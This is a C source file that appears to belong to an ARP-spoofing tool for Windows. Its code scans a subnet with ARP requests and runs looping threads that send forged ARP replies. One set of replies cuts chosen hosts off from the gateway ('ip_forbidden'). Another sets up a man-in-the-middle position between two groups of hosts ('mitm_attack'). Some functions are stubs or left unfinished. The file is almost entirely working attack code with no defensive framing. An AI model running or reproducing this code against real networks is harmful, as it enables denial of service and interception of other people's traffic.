#include "common_func.c"

DWORD WINAPI wlan_info_collect(LPVOID pM)
{
	printf("thread id:%d\n", GetCurrentThreadId());
	struct net_info *info = (struct net_info *) pM;

	char *net_interface = info->net_interface;
	printf("net_interface: %s\n", net_interface);
	get_packet(info);

	return 0;
}

DWORD WINAPI ip_forbidden_send(LPVOID pM)
{
	printf("thread id:%d\n", GetCurrentThreadId());
	struct net_info *info = (struct net_info *) pM;

	struct terminal *ptr = NULL;
	struct ether_header ether_hdr;
	struct arp_header arp_hdr;

	u_int8_t packet_content[1024];
	int packet_length;
	u_int16_t ether_type = 0x0608;
	u_int16_t operation_code = 0x0200;

	int i;
	while(info->ip_forbidden == 1)
	{
		ptr = info->target_fbd;
		while(ptr != NULL)
		{
			make_ether_packet(ether_type,
							  info->ether_address,
							  ptr->mac_address,
							  &ether_hdr);

			make_arp_packet(operation_code ,
							info->gateway_ip_address,
							info->empty_ether_address,
							info->gateway_ip_address,
							info->empty_ether_address,
							&arp_hdr);

			make_packet(packet_content,&packet_length,&ether_hdr,&arp_hdr);
			send_packet(info->net_interface , packet_content , packet_length);
			ptr = ptr->next;
		}
		for(i=0;i<50000000;i++) ;
	}
	printf("stop ip-forbidden stop\n");
	return 0;
}

DWORD WINAPI mitm_packet_send(LPVOID pM)
{
	printf("thread id:%d\n", GetCurrentThreadId());
	struct net_info *info = (struct net_info *) pM;
	struct terminal *ptr_A = NULL , *ptr_B = NULL;
	struct ether_header ether_hdr;
	struct arp_header arp_hdr;

	u_int8_t packet_content[1024];
	int packet_length;
	u_int16_t ether_type = 0x0608;
	u_int16_t operation_code = 0x0200;

	while(info->mitm_attack == 1)
	{
		ptr_A = info->target_A;
		while(ptr_A != NULL)
		{
			ptr_B = info->target_B;
			while(ptr_B != NULL)
			{
				make_ether_packet(ether_type,
								  info->ether_address,
								  info->broadcast_address,
								  &ether_hdr);

				make_arp_packet(operation_code ,
								ptr_B->ip_address,
								info->ether_address,
								ptr_B->ip_address,
								info->ether_address,
								&arp_hdr);

				make_packet(packet_content,&packet_length,&ether_hdr,&arp_hdr);
				send_packet(info->net_interface , packet_content , packet_length);
				ptr_B = ptr_B->next;
			}
			ptr_A = ptr_A->next;
		}

		ptr_B = info->target_B;
		while(ptr_B != NULL)
		{
			ptr_A = info->target_A;
			while(ptr_A != NULL)
			{
				make_ether_packet(ether_type,
								  info->ether_address,
								  info->broadcast_address,
								  &ether_hdr);

				make_arp_packet(operation_code ,
								ptr_A->ip_address,
								info->ether_address,
								ptr_A->ip_address,
								info->ether_address,
								&arp_hdr);

				make_packet(packet_content,&packet_length,&ether_hdr,&arp_hdr);
				send_packet(info->net_interface , packet_content , packet_length);
				ptr_A = ptr_A->next;
			}
			ptr_B = ptr_B->next;
		}
		int i;
		for(i=0;i<50000000;i++);
	}
	printf("stop mitm_attack\n");
}

void add_target(struct net_info *info,u_int8_t *target_ip_address ,struct terminal **target_set)
{
	u_int8_t target_mac_address[6];
	if(is_ip_in_list(info,target_ip_address,target_mac_address) != -1)
	{
		wlan_update(target_ip_address,target_mac_address,target_set);
		printf("adding success \n");

		display_host_list(*target_set);
		return ;
	}
	else
	{
		printf("can not find this host\n");
		return ;
	}
}

void host_list(struct net_info *info)
{	
	display_host_list(info->host);
	return ;
}

void wlan_scaning(struct net_info *info)
{
	struct ether_header ether_hdr;
	struct arp_header arp_hdr;
	u_int16_t ether_type = 0x0608;
	u_int16_t operation_code = 0x0100;
	u_int8_t  dest_ip[4];
	u_int8_t  dest_ether[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
	u_int8_t  packet_content[1024];

	int packet_length;

	memcpy(dest_ip,&(info->ip_address),4*sizeof(u_int8_t));
	u_int8_t cur_ip;

	make_ether_packet(ether_type,
					  info->ether_address,
					  info->broadcast_address,
					  &ether_hdr);

	for(cur_ip=1;cur_ip!=0;cur_ip++)
	{
		dest_ip[3] = cur_ip;
		make_arp_packet(
				operation_code,
				info->ip_address,
				info->ether_address,
				dest_ip,
				dest_ether,
				&arp_hdr
			);
		make_packet(packet_content,&packet_length,&ether_hdr,&arp_hdr);
		send_packet(info->net_interface,packet_content,packet_length);
		//printf("send %d packets\n", cur_ip);
	}
	printf("send 256 packets\n");
}

void ip_conflict()
{

}

void ip_forbidden(char *net_interface,struct terminal *dst,struct terminal *src)
{
	struct ether_header ether_hdr;
	struct arp_header arp_hdr;
	
	memcpy(&ether_hdr.ether_dhost,&dst->mac_address,6*sizeof(u_int8_t));
	memcpy(&ether_hdr.ether_shost,&src->mac_address,6*sizeof(u_int8_t));
	ether_hdr.ether_type = 0x0806;

	arp_hdr.arp_operation_code = 2;
	//memcpy();
	//memcpy();

	u_int8_t packet[1024];
	int len = 0;
	make_packet(&packet,&len,&ether_hdr,&arp_hdr);

	send_packet(net_interface,packet,len);
}
